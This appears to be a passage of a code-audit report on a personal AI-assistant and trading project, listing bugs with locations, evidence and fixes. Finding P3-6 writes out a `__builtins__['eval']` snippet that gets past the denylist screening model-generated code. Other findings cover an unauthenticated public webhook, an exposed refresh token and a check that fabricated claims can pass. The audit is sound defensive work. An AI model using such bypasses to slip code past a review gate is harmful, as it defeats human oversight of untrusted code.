- problem: (a) the DB is opened with `f"file:{path}?mode=ro"` without percent-encoding, so a path containing `?`, `#` or `%` is truncated or misread by SQLite (use `Path.as_uri()` or `urllib.parse.quote`). (b) Any `sqlite3.OperationalError` from the SELECT, including "no such column"/"no such table" after Codex changes its schema (the file is already version-named state_5.sqlite), is converted into `{"configured": False, ...}`, which the callers and the sync CLI treat as "nothing to do" and exit 0. A real break looks identical to a machine without Codex.
- evidence: `except sqlite3.OperationalError:` returning `"configured": False`
- scenario: after a Codex update renames a column or the DB moves to state_6, history sync silently imports zero threads forever with no log line.
- fix: return a distinct `error` field with the exception text for the SELECT failure and let the CLI print it.

### P3-38 [low] model_check._matches treats a tagless model name as present if any tag is installed
- where: dourmouse/model_check.py:78-84
- problem: the docstring says it tolerates the implicit `:latest` tag, but for a name without ":" it accepts any installed tag. With only `qwen3:4b` installed, a configured `qwen3` is reported present, and Ollama (which resolves `qwen3` to `qwen3:latest`) returns 404 at call time, which is the exact failure this module was written to catch.
- evidence: `return any(a.split(":", 1)[0] == wanted for a in available)`
- scenario: startup check says all configured models are present; the first request 404s.
- fix: compare against `f"{wanted}:latest"`.

### P3-39 [low] The Claude orchestrator briefing hardcodes a desktop-vault claim and probes the retired desktop over SSH
- where: dourmouse/model_context.py:91-99
- problem: `_rag_lines` calls `desktop_rag.desktop_rag_status()` (which SSHes to the desktop, desktop_rag.py:547-559) while building the first-turn preamble, and tells the model the vault holds "~1,023,765 chunks of reference text on the Windows desktop over SSH". The number is a fixed literal that is never read from the probe, and the project's current device policy retires the desktop. The briefing is cached after the first build, so a stale claim and a possible SSH wait are baked into the first turn of every session.
- evidence: `f"  desktop vault — ~1,023,765 chunks of reference text on the "`
- scenario: the model is told a vault exists and is "reachable"/"UNAVAILABLE" on a machine that no longer exists, and may promise lookups that cannot work; the first turn pays the SSH probe latency.
- fix: drop the line or take the count and host from the status result, and skip the probe when no desktop host env is configured.

### P3-4 [low] spec["code"] of a non-string type raises TypeError that the callers do not catch
- where: dourmouse/atlas/atlas_proposals.py:364-367, 403-404
- problem: the field check only tests `str(spec[k]).strip()`, so a list or dict "code" passes. `_static_safety_check(code)` then calls `ast.parse` on a non-string and raises TypeError, which is neither RuntimeError nor ValueError (the handler's catch per the comment at :290-298).
- evidence: `safety_note = _static_safety_check(code)`
- scenario: the model returns "code": ["def run(...):", "..."]; the HTTP request thread dies with no response, the same "Failed to fetch" symptom the file's own comment says it fixed for API errors.
- fix: require `isinstance(spec["code"], str)` in `_generate_spec_once` and raise RuntimeError so the retry loop handles it.

### P3-42 [low] mt5_panel_snapshot starts a new probe subprocess on every poll while the cache is stale
- where: dourmouse/mt5_ops.py:376-390
- problem: when the cache is older than 20s it starts a new `_refresh_panel` thread each call, with no "refresh in flight" flag, and each thread runs `mt5_probe panel` (up to 15s). If the HUD polls more often than the probe returns (the case the comment describes: terminal stuck at the no-account screen), several probes and MT5 `initialize()` calls pile up concurrently against the same terminal.
- evidence: `threading.Thread(target=_refresh_panel, daemon=True).start()` inside `if not fresh:`
- scenario: a stuck terminal plus a 3s HUD poll leads to ~5 concurrent mt5_probe processes, each blocked in the DLL until killed at 15s.
- fix: guard with a module-level in-progress flag/lock and skip the spawn while one is running.

### P3-44 [low] The cached routing model can pair new weights with the previous agent vocabulary
- where: dourmouse/orch_net.py:604-615, 685-697, 725-731
- problem: `train` saves the weights file before writing meta.json (which holds `agent_names`). `_load_active_model` keys its cache on the weights mtime and reads meta afterwards, so a load that lands between the two writes caches the new net with the old vocabulary until the next retrain. `neural_agent_scores` then maps agent names to wrong logit rows, or raises IndexError when the new vocabulary is larger than the old one.
- evidence: `net.save(self.weights_path)` precedes `self._write_meta(meta)`
- scenario: a retrain triggered by a chat turn overlaps with the next turn's routing; routing boosts the wrong agent (or throws) for the rest of the process lifetime.
- fix: write meta first (or store agent_names inside the npz) and validate `net.W3.shape[0] == len(agents)` before caching.

### P3-45 [low] os_api route table is marked loaded before the backend modules finish importing
- where: dourmouse/os_api/__init__.py:67-80, 89-91
- problem: `_load` sets `_loaded = True` first and then imports each module; there is no lock. In a ThreadingHTTPServer the first two simultaneous requests race: the second thread's `find()` sees `_loaded` True, skips loading and looks up `_ROUTES` while the first thread is still importing, so it gets `None` (a 404 for a valid route) and the route may be cached as missing by the caller's fallback.
- evidence: `_loaded = True` immediately after `if _loaded: return`
- scenario: the OS shell fires several screen requests at start-up; one of them intermittently returns "not found" until reload.
- fix: guard `_load` with a lock and set `_loaded` after the loop (or load eagerly at server start).

### P3-46 [low] project_bookkeeper cannot find the Claude Code project directory for any path containing a space, dot, underscore or similar character
- where: dourmouse/project_bookkeeper.py:184-196, 358-362
- problem: `_sanitized_dirname` only replaces "/" and "\\" with "-", but Claude Code replaces every non-alphanumeric character. Real directories under ~/.claude/projects show it: `/Users/aditagrawal/Claude code` is `-Users-aditagrawal-Claude-code`, and `/Volumes/ATLAS /Atlas/dourmouse-4.0.0` is `-Volumes-ATLAS--Atlas-dourmouse-4-0-0`. For such projects `claude_dir.is_dir()` is False, so no session context is extracted and the card gets `context_source: "none"` while its `claude_code` source is listed.
- evidence: `return path.replace("/", "-").replace("\\", "-")`
- scenario: the user's own "Claude code" project (and anything with a dotted version in its path) shows an empty context on the PROJECTS shelf.
- fix: `re.sub(r"[^A-Za-z0-9]", "-", path)`.

### P3-48 [low] QualificationPipeline.step raises a bare StopIteration, and the record stays stuck, when the current exam paper is no longer pending
- where: dourmouse/research_mesh/pipeline.py:97-103
- problem: in the TESTING branch `next(x for x in pending_iterations(...) if x.paper.id == record.current_iteration)` has no default. If the corpus changed since the record was saved (paper removed or renamed, or already in `passed_iterations`), the generator is empty and `next` raises StopIteration out of `step`/`run`. Nothing is saved, so every resume repeats the same crash with no useful message.
- evidence: `it = next(x for x in pending_iterations(`
- scenario: resuming a persisted agent after a papers folder refresh dies with StopIteration.
- fix: pass a default and fail the record or reset to READY with a clear message.

### P3-5 [low] Every approved local run leaves its work directory behind
- where: dourmouse/atlas/atlas_proposals.py:677-679
- problem: each run creates workspace/atlas_lab/tmp/<run id>/ with strategy_module.py and harness.py and nothing ever deletes it. This checkout has 22 such directories under dourmouse/workspace/atlas_lab/tmp (the newest from today's test run, so the tests also write into the real workspace).
- evidence: `work_dir = _workspace_root() / "atlas_lab" / "tmp" / run.id`
- scenario: LLM-authored code and harnesses accumulate in the workspace indefinitely (the directory is gitignored, so this is disk growth and leftover untrusted code, not repo content).
- fix: remove work_dir in a finally block after `run_sandboxed`, or prune old ones.

### P3-50 [low] ResearchRecord.reject_claim accepts a reason and throws it away
- where: dourmouse/research_pipeline/core.py:186-193
- problem: the docstring says the REJECTED copy keeps the record "honest about what was once claimed and why it was dropped", but `reason` is never stored: `replace(self.claims[index], status="REJECTED")` sets only the status, and Claim has no field for it. The parameter is dead, so the "why" is lost. A negative or out-of-range `index` also silently rewrites the wrong claim or raises IndexError.
- evidence: `rejected = replace(self.claims[index], status="REJECTED")` (reason unused)
- scenario: after a later pass rejects a claim, the persisted record shows it as REJECTED with no explanation, defeating the audit trail the module advertises.
- fix: add a `rejected_reason` field to Claim and set it here; validate `0 <= index < len(claims)`.

### P3-52 [low] render_page leaks a headless Chrome and a thread when the render overruns, and reports the requested URL as final_url
- where: dourmouse/research_pipeline/render.py:82-142, 160-164
- problem: (1) when `t.join(timeout_ms/1000 + 30)` times out, `render_page` raises "render did not finish in time" but leaves the daemon thread running `asyncio.run(_render_async(...))`; its `browser.close()` only runs when that coroutine finally unwinds, so a hung page keeps a Chrome process alive indefinitely. (2) `net_guard.guarded_urlopen` follows redirects inside Python and the response is fulfilled to the page as a plain 200, so Chrome never sees the redirect and `page.url` stays the originally requested URL; `RenderResult.final_url` therefore never reflects the post-redirect address, which Claim provenance (`final_url`, finding #089) is supposed to record, and relative sub-resources resolve against the wrong base.
- evidence: `final_url=page.url,`
- scenario: a page that stalls leaves orphaned Chrome processes after each attempt; a rendered page behind a redirect is cited under the pre-redirect URL.
- fix: cancel the loop/close the browser on timeout (wait_for inside the coroutine), and return the last URL from `_guarded_fetch` for the main document.

### P3-53 [low] plan() keeps a stray "- " prefix on indented bullet lines
- where: dourmouse/research_pipeline/stages.py:165-168
- problem: the filter tests `line.strip().startswith("- ")` but the value is taken as `line[2:].strip()` from the unstripped line. For an indented bullet such as `  - What is X?` the slice removes the two leading spaces and keeps the dash. Models commonly indent list items.
- evidence: verified: `"  - What is X"` gives sub-question `"- What is X"`.
- scenario: sub-questions that start with "- " are stored in the plan and sent to source discovery and extraction prompts and into Claim.sub_question (which is also the contradiction grouping key).
- fix: use `line.strip()[2:].strip()`.

### P3-55 [low] The verbatim-passage check accepts any substring, however short or unrelated
- where: dourmouse/research_pipeline/stages.py:316-323
- problem: the only gate between a model reply and a sourced Claim is `normalize(passage) in normalize(fetched_text)`. A one-word or one-letter passage ("the", "a") is a substring of any page, so a fabricated claim passes the check and is stored with a real URL, hash and "passage", which the module presents as "harsh acceptance test 1 ... enforced in code". There is no minimum length and no check that the passage overlaps the claim text.
- evidence: `if _normalize_whitespace(passage) not in _normalize_whitespace(fetched_text):`
- scenario: a model asked for a claim on a thin page replies with an invented sentence and PASSAGE: "the"; the claim is accepted and later cited in the synthesis.
- fix: require a minimum passage length (e.g. 40 characters or 6 words) and some lexical overlap between claim and passage.

### P3-56 [low] connectivity.diagnose tries only the first resolved address and files handshake and HTTP timeouts under the wrong categories
- where: dourmouse/security/connectivity.py:77-82, 103-113, 129-131
- problem: (1) `family, _, _, _, sockaddr = infos[0]` connects to the first address only. A host whose first record is an unreachable IPv6 address (common on networks without IPv6) is reported ROUTING or UNKNOWN even though the IPv4 addresses work and the page loads in a browser. (2) The module docstring defines TIMEOUT as "the connection or handshake never answered", but a TLS handshake timeout is caught by `except (ssl.SSLError, TimeoutError, OSError)` and returned as category TLS with "the encrypted session failed", which suggests interception; an HTTP-step timeout is returned as UNKNOWN. The "never guesses" claim then misleads the user.
- evidence: `except (ssl.SSLError, TimeoutError, OSError) as exc:` returning `done(TLS, ...)`
- scenario: a silent firewall that drops the handshake produces a TLS "possible interception" diagnosis instead of TIMEOUT.
- fix: iterate over all addresses (like `socket.create_connection`), and map `TimeoutError` in the TLS and HTTP steps to TIMEOUT.

### P3-57 [low] lockdown.site_is_blocked reports a site as blocked whenever DNS fails, so status shows "blocked_now" while offline or with the helper missing
- where: dourmouse/security/lockdown.py:478-484, 531-536
- problem: the docstring says "Whether a site is really blocked is checked by resolving it, never assumed", but `except socket.gaierror: return True` treats any resolution failure as a successful block. With the network down, a flaky resolver, or a typo domain, every listed site shows `blocked_now: True` even though /etc/hosts was never written (for example because the root helper is not installed). Each status() call also does two blocking getaddrinfo lookups per site with no timeout.
- evidence: `except socket.gaierror:` followed by `return True`
- scenario: the Mac is offline during a lockdown; the console shows all sites as blocked while a later reconnect finds none of them blocked.
- fix: return a third state (unknown) on gaierror, and only report blocked when the answer is 0.0.0.0/::.

### P3-58 [low] More than 500 blocked domains makes the root helper clear the whole block silently
- where: dourmouse/security/lockdown_helper.py:45, 82-90, 187-196 (writer side: dourmouse/security/lockdown.py:470-475)
- problem: `valid_domains` raises RequestError when the request lists more than MAX_DOMAINS (500), and `do_apply` turns any ValueError into "clearing the block". The app side (`write_hosts_request`) has no matching cap: `Blocklist.add_site` and `block_domain_always` accept unlimited entries. A list over the limit therefore removes every hosts block, including the permanent "always" security blocks, and the only trace is a line in /var/log/dourmouse-lockdown-helper.log; `status()` still reports the sites as active and `site_is_blocked` is True on DNS failure (see P3-57).
- evidence: `raise RequestError("the request lists more than %d names" % MAX_DOMAINS)`
- scenario: the owner's list (or a security response that adds many malware domains) crosses 500 and lockdown stops blocking websites without any visible warning.
- fix: enforce the same cap in add_site/block_domain_always (with a clear error), or truncate with a warning in the helper instead of clearing.

### P3-59 [low] Host firewall check reads "block all incoming" mode as firewall off
- where: dourmouse/security/mac_telemetry.py:166-167
- problem: the check treats the firewall as on only if the output contains "State = 1" or the word "enabled". macOS reports the "block all incoming connections" mode as State = 2 with different wording, which matches neither test, so `on` is False and the host-protection report flags a stricter firewall as disabled. This is from knowledge of socketfilterfw output and was not verified on this Mac; the sample parsers in the module are described as tested against captured output, but only State 0/1 text is covered.
- evidence: `"on": ("State = 1" in txt or "enabled" in txt.lower()) if ok else None`
- scenario: an owner who enables "Block all incoming connections" gets a false "firewall is off" security finding.
- fix: parse `State = (\d)` and treat any non-zero value as on.

### P3-6 [low] Static safety pre-filter denylist is bypassed by `__builtins__` as a Name
- where: dourmouse/atlas/atlas_proposals.py:233-241
- problem: only `ast.Attribute` names and Call-of-Name are blocked. `__builtins__['eval'](...)`, `vars(__builtins__)[...]` and `globals()` pass the check. The docstring says the filter refuses anything it cannot classify as safe. The module does state that the sandbox is the real boundary, so this is limited to the pre-review filter and the claimed "refused twice" property.
- evidence: verified: `_static_safety_check("def run(load, params):\n    return __builtins__['eval']('1')\n")` returns '' (accepted).
- scenario: hostile code reaches the human review queue, and the desktop engine relies on its own copy of the check.
- fix: also reject ast.Name ids `__builtins__`, `globals`, `vars`, `locals`, `type`, `breakpoint`, or switch to an allow-list of node types.

### P3-61 [low] Security report rates the Downloads area "good" without having checked anything, and hardcodes a ClamAV statement
- where: dourmouse/security/report.py:49-54, 57-65, 126-129
- problem: the module promises that a dimension with nothing to go on is UNKNOWN, never good. The `downloads` dimension declares `"needs": ()`, so `available = all([])` is True and, with no findings, `rate` returns GOOD even when the download watcher never ran or the downloads list is empty because nothing was scanned. Separately, the unknowns list always says "Malware inside files is only detected when a scanner (ClamAV) is installed; none is.", with no check for ClamAV, so the sentence is false on a Mac that has it.
- evidence: `"needs": (),` and `"... (ClamAV) is installed; none is."`
- scenario: a report generated before any download was ever scanned says the downloads area is good.
- fix: give the downloads dimension a real availability signal (watcher running / recent scan) and detect ClamAV (`shutil.which("clamscan")`) before writing that line.

### P3-62 [low] tv_webhook_server accepts every request when TV_WEBHOOK_SECRET is empty, and reads a quoted secret differently from the main server
- where: dourmouse/tv_webhook_server.py:1-18, 72-88, 97 (with dourmouse/tradingview_ops.py:106-147)
- problem: the module exists so a public tunnel can be pointed at one endpoint, and its docstring says the secret gate is enforced. `validate_signal` only checks the secret when one is configured ("Empty/absent = open webhook"), and `main` neither warns nor refuses to start without it, so a tunnelled instance with no secret lets anyone on the internet inject signals into the paper log and the agent bus. `_load_env` also parses .env by hand and keeps surrounding quotes (`TV_WEBHOOK_SECRET="abc"` becomes `"abc"` including the quotes), while the main server loads the same file with python-dotenv, which strips them, so the two servers can hold different secrets. The secret is compared with `!=` (not constant time), and `rfile.read(length)` has no socket timeout, so a slow client holds a handler thread.
- evidence: `server = DourmouseHTTPServer(("127.0.0.1", parsed.port), _Handler)` started with no secret check
- scenario: the owner starts the standalone listener behind cloudflared before setting the secret; arbitrary POSTs are accepted and routed to paper trades.
- fix: refuse to start (or print a loud warning) when the secret is empty, use python-dotenv for parsing, `hmac.compare_digest`, and set a request timeout.

### P3-64 [low] Spotify 401 handling can recurse without bound, and refresh failures escape as raw urllib errors
- where: dourmouse/spotify_services.py:147-155, 185-194, 252-269
- problem: the comment in `_handle_http_error` says "refresh ONCE and retry", but the retry is `return _api(method, path, params, body)`, which re-enters the same 401 handler with no attempt counter. If the refresh succeeds but the API keeps answering 401, each loop makes two real HTTP requests until RecursionError. Separately, `_refresh_access_token` calls `_post_form`, which does not catch urllib errors, so an expired or revoked refresh token raises HTTPError/URLError from `_access_token()`, which callers that only catch RuntimeError (for example `_playback_state_uncached`) do not handle.
- evidence: `return _api(method, path, params, body)` inside the 401 branch
- scenario: a revoked grant or a scope mismatch turns a single tool call into hundreds of token and API requests, then a traceback.
- fix: pass a `retried` flag and raise RuntimeError on the second 401; wrap `_post_form` failures as RuntimeError.

### P3-65 [low] Spotify refresh token is written world-readable, and the login callback accepts any request
- where: dourmouse/spotify_services.py:129-132, 300-322, 416-427
- problem: (1) `_save_tokens` uses `path.write_text` with the default umask, so the never-expiring refresh token in workspace/spotify_tokens.json is created 0644 (the docstring only promises it is gitignored). (2) `_CallbackHandler.do_GET` overwrites `captured_code`/`captured_state` for any GET to the loopback port, including a web page in the user's browser fetching `http://127.0.0.1:8766/callback?code=x`. The wait loop stops as soon as any code is captured and the state check then fails, so one stray request aborts the login while the real callback arrives after the server is closed. An `?error=access_denied` callback has no code, so the loop silently waits for the full 180 seconds.
- evidence: `path.write_text(json.dumps(tokens, indent=2))`
- scenario: another local user reads the refresh token on a shared Mac; a malicious page makes the one-time link flow fail on demand.
- fix: create the file 0600 (os.open with mode), ignore callbacks whose state does not match, and treat `error=` as a terminal failure.

### P3-66 [low] Spotify read helpers hide or mis-state real conditions
- where: dourmouse/spotify_services.py:531-537, 874-884
- problem: `_playback_state_uncached` catches every RuntimeError, including "NOT LINKED" and the 401/403 auth errors, and reports "playback not available on this account/device", so an unlinked or expired account looks like a device problem. `list_playlists` prints `p.get('tracks', {}).get('total', 0)`: when the API omits the count it shows "0 tracks", although `playlists_data` (same file) states "a playlist with tracks must never display as 0" and returns None in that case; a `tracks` value of None would raise AttributeError.
- evidence: `rows.append(f"- {p.get('name')} ({p.get('tracks', {}).get('total', 0)} tracks) {p.get('uri')}")`
- scenario: the agent tells the user their playlists are empty or that playback is unavailable when the real cause is a missing count or an auth failure.
- fix: re-raise NOT LINKED/auth errors, and print "?" when the count is absent.

### P3-7 [low] bench.percentile is not nearest-rank: it overshoots by one rank for exact products
- where: dourmouse/bench.py:176
- problem: the docstring says nearest-rank, which is ceil(pct/100*n). The code uses `int(round(pct/100*n + 0.5))`, which for an integer product x gives round(x+0.5), and Python rounds halves to even, so the result is x or x+1 depending on parity.
- evidence: verified: percentile(range(1,11), 50) returns 6 (nearest-rank is 5); percentile([1,2], 50) returns 2 (should be 1).
- scenario: the p50 and p95 numbers the module calls its headline statistic are biased high for typical repeat counts (even n), which skews before/after model comparisons.
- fix: `rank = max(1, min(n, math.ceil(pct / 100.0 * n)))`.

### P3-70 [low] world_pulse_history rewrites the whole file on every snapshot, writes it non-atomically, and never applies the retention prune its docstring promises
- where: dourmouse/world_pulse_history.py:10-26, 125-130, 133-159
- problem: the docstring describes an append-only JSONL log whose `prune_old` also runs automatically inside `record_snapshot`. In code `record_snapshot` reads and parses every line, appends one record and rewrites the entire file with `path.write_text` (truncate then write), and never calls `prune_old`, so only the 1000-line cap bounds it and the 24-hour retention is not applied. Each snapshot embeds a full geo dict, so the file can reach tens of MB and is re-read and re-written every 90 seconds. A crash or kill during the write leaves a truncated file, and `_read_lines` then silently drops every damaged line, losing most of the scrubber history.
- evidence: `path.write_text(body, encoding="utf-8")` in `_write_lines`
- scenario: the HUD poll thread is killed during a write (app quit) and the next start shows an almost empty 24-hour history.
- fix: append a single line with open("a") for the common case, prune by age before writing, and write the rewrite via temp file + os.replace.

### P4-1 [low] atlas_version() never caches a failed probe, so every /api/atlas poll can block up to 60 s
- where: dourmouse/atlas/atlas_cli.py:228-240 (called from atlas_panel_snapshot:808, served by webui.py:3285)
- problem: the 60 s TTL cache is only written on success. When `atlas version` exits non-zero, prints nothing, or raises, `value` is None / the except returns early, nothing is cached, and the next poll runs the subprocess again.
- evidence: `return None  # do NOT cache a failure — the next poll retries honestly`
- scenario: ATLAS venv is configured but broken (bad import). The HUD polls GET /api/atlas about every 6 s; each poll synchronously spawns a python subprocess with timeout=60 inside the HTTP handler, so one hung CLI stalls the panel request thread for a minute and several overlapping polls pile up processes.
- fix: cache failures too, with a short negative TTL (for example 30 s), and run the probe off the request thread.

### P4-11 [low] Headless popup following stops working after 50 pages because the _NEW_PAGES window is trimmed to a fixed length
- where: dourmouse/browser_agent.py:479-481, 1233-1235, 1274
- problem: `_on_page` appends then does `del _NEW_PAGES[:-50]`, so the list length saturates at 50. `_action_mark()` records `len(_NEW_PAGES)` (50) and `_settle_after_action` reads `_NEW_PAGES[mark["new"]:]`. Once the list is full, a new popup is appended and the oldest dropped, length stays 50, the slice is empty, and the popup is never seen.
- evidence: `del _NEW_PAGES[:-50]` together with `fresh = [p for p in _NEW_PAGES[mark["new"] :] if not p.is_closed()]`
- scenario: a long-running headless browsing session (50+ pages or popups opened in total): a click on a target=_blank link opens a tab that the agent silently ignores and keeps acting on the old page, with no NOTE.
- fix: use a monotonically increasing counter (or compare against a set of page ids seen before the action) instead of a list length.

### P4-12 [low] _call() abandons a timed-out coroutine without cancelling it, so a "timed out" browser action can still happen later
- where: dourmouse/browser_agent.py:640-650
- problem: on `concurrent.futures.TimeoutError` the future is not cancelled; the coroutine keeps running on the browser loop (holding the owner/model claim) and may still click, type or submit after the model was told it timed out and was invited to retry.
- evidence: `raise RuntimeError(f"BROWSER TIMEOUT after {timeout:.0f}s — the page may be stuck. Use browser_wait or retry.") from None`
- scenario: browser_submit on a slow page exceeds 60 s, model is told to retry, the first submit then completes and the retry submits the form (order, post) a second time.
- fix: call `fut.cancel()` before raising.

### P4-13 [low] A relaunched headless Chrome leaks the previous browser process; close_browser never closes the browser or stops Playwright
- where: dourmouse/browser_agent.py:728-756, 2051-2071
- problem: `browser = await _PW.chromium.launch(...)` is not stored. When the held page and context are gone (`live` empty), the code launches another Chrome and the old one keeps running. `close_browser` closes only `_CONTEXT`, never the browser, the CDP `_BROWSER`, or `_PW.stop()`.
- evidence: `browser = await _PW.chromium.launch(channel="chrome", headless=headless)` (local variable, no reference kept)
- scenario: the owner or a page closes the last tab in headless mode; every later browser tool call spawns a fresh Chrome, leaving a stranded headless Chrome per relaunch until the app exits.
- fix: keep `_HEADLESS_BROWSER` globally, close it before relaunch and in close_browser, and call `_PW.stop()` at teardown.

### P4-14 [low] Per-turn recall and skill blocks are inserted into self.messages and never removed in a live session, so stale ones keep being re-sent
- where: dourmouse/chat.py:249-271 (cleanup only at 408-415 on resume)
- problem: the comment says the recall block is "never a stale recall block from a previous turn", but ask() only inserts a new "REMEMBERED CONTEXT" system message (and a "[SKILL: ...]" message) before the user turn; nothing deletes the previous turn's. Only `_load_state` strips "REMEMBERED CONTEXT" messages, and only on restart; skill blocks are never stripped. webui keeps one ChatSession for the process lifetime, so they accumulate until the token window drops them, and are also written to the .messages.json snapshot.
- evidence: `self.messages.insert(-1, {"role": "system", "content": block})`
- scenario: after asking about topic A then topic B, the model still receives topic A's recalled facts and skill text for B's turn (as long as they fit the window), contradicting the stated design and wasting context; the snapshot file grows without bound.
- fix: remove prior recall/skill system messages (tag them) at the start of each ask(), or pass them to the model without storing them in self.messages.

### P4-15 [low] Session state snapshot is written non-atomically and a truncated file then makes every later resume raise
- where: dourmouse/chat.py:467, 389-397
- problem: `self._state_file.write_text(json.dumps(self.messages))` rewrites the whole file in place; a crash or kill mid-write leaves truncated JSON. `_load_state` turns that into `RuntimeError("cannot resume session state ...")`, and `most_recent_session_file` (used for restart resume) selects exactly the most recently written ledger. Also `json.dumps(record)` in `_persist` has no `default=`, while the hash uses `default=str`, so a non-serializable transcript value raises after the hash was computed, from inside `ask()`'s finally block (masking the original exception).
- evidence: `raise RuntimeError(f"cannot resume session state from {self._state_file}: {exc}")`
- scenario: the app is force-quit during a turn's persist; on the next launch the session constructor raises and chat cannot start until the user deletes the .messages.json by hand.
- fix: write to a temp file and `os.replace`; on a corrupt snapshot rebuild messages from the ledger or start fresh with a warning; use `default=str` in the ledger dump so the written bytes match what was hashed.

### P4-18 [low] _open_in_chrome always reports success, so the default-browser fallback never runs when the Chrome launch fails
- where: dourmouse/desktop.py:319-321
- problem: `openURLs:withApplicationAtURL:options:configuration:error:` has an output NSError** argument, so PyObjC returns a tuple `(runningApp_or_None, error)`. `bool(ok)` on a 2-tuple is always True, even for `(None, <NSError>)`.
- evidence: `ok = workspace.openURLs_withApplicationAtURL_options_configuration_error_(... , None)` then `return bool(ok)` (selector metadata shows the last argument as `o^@`)
- scenario: Chrome is present but the launch is refused (sandbox, damaged app, user denies); open_external returns True, the Google sign-in consent URL is never opened anywhere, and the webview shows no error.
- fix: unpack `app, err = ...` and return `app is not None`.

### P4-19 [low] DesktopNotifier builds AppleScript strings with json.dumps, so non-ASCII alert text is shown as literal \uXXXX
- where: dourmouse/desktop.py:698-701
- problem: AppleScript string literals only understand `\n \r \t \" \\`; json.dumps(ensure_ascii=True) turns every non-ASCII character into a `\uXXXX` sequence that AppleScript prints verbatim.
- evidence: `json.dumps((title or "DOURMOUSE alert")[:80])`
- scenario: an alert titled "EUR/£ spike" or containing an emoji or accented letters shows as `EUR/£ spike` in the macOS notification.
- fix: use `json.dumps(s, ensure_ascii=False)` (or a dedicated AppleScript escaper), and still truncate on characters.

### P4-2 [low] atlas_command standard formatter crashes on partial standard files and mis-grades permutation p == 0
- where: dourmouse/atlas/atlas_command.py:85-103
- problem: `f"{nums.get('permutation_p'):.4f}"` raises TypeError when the key is missing or null, `f"{core.get('terminal', '—'):.2f}"` raises ValueError when portfolio_core lacks `terminal` (the '—' default is a str with a float format spec), and `nums = s["numbers"]` / `s['protocol']` / `s['config']` raise KeyError. The PASS/FAIL expression `(nums.get('permutation_p') or 1) < 0.01` treats an exact 0.0 p-value as 1, so a perfect result prints FAIL.
- evidence: `'PASS' if (nums.get('permutation_p') or 1) < 0.01 else 'FAIL'`
- scenario: an older or partially written validation_standard.json (e.g. validation interrupted) makes atlas_standard and atlas_full_status throw instead of the honest-error text the module promises; a standard with permutation_p 0.0 reports FAIL against the p<0.01 bar. (Module is currently unplugged in general_roster.py:5054.)
- fix: format only after checking numeric types (`isinstance(x, (int, float))`) and use `p is not None and p < 0.01`.

### P4-20 [low] The one automatic retry doubles the worst-case TIMEOUT wait to about five minutes, contradicting the "hard timeout, never wedges a chat turn" contract
- where: dourmouse/desktop_rag.py:366-402, 184
- problem: `_remote_call` retries on both UNREACHABLE and TIMEOUT. A TIMEOUT means the first attempt already burned the full `_DEFAULT_TIMEOUT` (150 s); the retry waits another 2 s plus another 150 s. The rationale in the comment (a brief network flap) only fits UNREACHABLE, which fails in at most the 10 s ConnectTimeout.
- evidence: `if exc.kind not in ("UNREACHABLE", "TIMEOUT") or attempt >= retries:`
- scenario: the desktop is up but the cold query is slow or hung; the chat turn that called format_desktop_rag blocks about 302 s instead of the 150 s the docstring and the TIMEOUT message promise (and the error message names only the last timeout).
- fix: retry only on UNREACHABLE, or share one total deadline across attempts.

### P4-22 [low] read_file_for_summary reads the entire file after sniffing 8000 bytes, so a huge text-like file is loaded fully into memory
- where: dourmouse/device_wiki/stages.py:66-74
- problem: the code sniffs the first 8000 bytes for a NUL, then `p.read_text(...)` loads the whole file, only afterwards truncating to 8000 characters; the docstring says the bound exists so that "a genuinely huge file" is never read just to classify it.
- evidence: `text = p.read_text(encoding="utf-8", errors="replace")`
- scenario: a multi-GB log or SQL dump without NUL bytes in its first 8 KB is read fully into RAM during a wiki scan.
- fix: reuse the already-open handle and `fh.read(_MAX_CONTENT_CHARS * 4)`.

### P4-25 [low] Sector concentration check ignores a trade whose sector label differs from the held position's sector
- where: dourmouse/guardrails.py:153-166
- problem: `_sector_value_after` only sums positions whose `pos.sector == trade.sector`; for the traded symbol it adds the post-trade value only inside that loop or when the symbol is not held at all. If the symbol is already held under another sector label, the trade's delta is added to neither sector, so the check sees no change.
- evidence: `if trade.symbol not in account.positions: total += _position_value_after(account, trade)`
- scenario: AAPL held as sector "tech" (25% of equity); a BUY of AAPL with sector "other" adds 20% but both the "tech" total (not recomputed) and "other" total (0) stay under 30%, so `max_sector_concentration` passes (reproduced with a 100k account: checks["max_sector_concentration"] is True).
- fix: take the sector of an existing position from the account (not from the caller) and evaluate that sector with the post-trade value.

### P4-28 [low] list_remote_changed_files strips leading dots from file names with lstrip("./")
- where: dourmouse/history_sync.py:256
- problem: `str.lstrip("./")` removes any run of `.` and `/` characters, not the `./` prefix, so a path like `./.archive/session.jsonl` becomes `archive/session.jsonl` and the later scp of `<root>/archive/session.jsonl` fails (file not found), silently counted as not pulled.
- evidence: `[line.strip().lstrip("./") for line in result.stdout.splitlines() if line.strip()]`
- scenario: a project directory or file whose name starts with a dot under ~/.claude/projects is never mirrored.
- fix: `line.strip().removeprefix("./")`.

### P4-3 [low] atlas_ui_ops puts the wrong directory on sys.path (module moved into dourmouse/atlas/)
- where: dourmouse/atlas/atlas_ui_ops.py:16-18
- problem: `_ROOT = Path(__file__).resolve().parent.parent` is now `dourmouse/`, but `atlas_terminal` lives at the repo root. The insert therefore never makes `from atlas_terminal import data` resolvable; it only works when the repo root is already on sys.path (cwd or pytest rootdir). It also prepends `dourmouse/` to sys.path, so top-level names like `config`, `cache`, `voice`, `sdk`, `skills`, `hooks`, `report` now resolve to Dourmouse modules for any later import.
- evidence: `_ROOT = Path(__file__).resolve().parent.parent`
- scenario: packaged or launched from another cwd: the tool answers "unavailable — No module named 'atlas_terminal'"; meanwhile the import of this module shadows third-party modules with the same names.
- fix: use `.parents[2]` (repo root) and do not insert `dourmouse/`.

### P4-30 [low] apply() can overwrite an existing destination and moves "duplicates" without re-checking that the keeper still exists or that the contents still match
- where: dourmouse/librarian.py:303-325, 281-282
- problem: when `dst.exists()` the code renames to `name (<epoch seconds>).ext` but does not re-check the new name, so three or more same-named extras in one second map to the same path and `shutil.move` replaces the earlier one (POSIX rename overwrites), contradicting "never overwrites". Also nothing at apply time verifies that `ps[0]` (the file that "stays where it is") still exists or that the hash is current; the index can be up to a full pass old.
- evidence: `dst = dst.with_name(f"{dst.stem} ({int(time.time())}){dst.suffix}")` followed by `shutil.move(str(src), str(dst))`
- scenario: A, B, C are duplicates named IMG_1.jpg in different folders; the user deletes A after the last pass; applying "duplicates" archives B and C (and the second rename collides with the first), so no copy is left in place and the undo record for the overwritten one points at a path that now holds the other file.
- fix: loop until the candidate destination does not exist (or use a counter), and before each move confirm the keeper exists and re-hash src and keeper.

